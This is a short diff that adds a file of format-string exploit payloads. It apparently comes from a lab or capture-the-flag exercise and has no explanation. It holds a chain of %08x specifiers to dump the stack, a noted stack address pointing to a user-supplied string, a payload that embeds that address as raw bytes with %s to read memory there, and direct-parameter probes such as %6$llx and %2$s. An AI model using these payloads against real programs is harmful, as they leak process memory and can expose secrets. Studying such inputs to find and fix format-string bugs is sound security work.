@@ -1,0 +1,15 @@
+%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
+
+
+0x7fffffffdc90 --> 0xa72616d6f ('omar\n')
+
+
+\x90\xdc\xff\xff\xff\x7f %x %x %x %x %s
+
+
+
+%6$llx
+
+%2$s
+
+%0$s
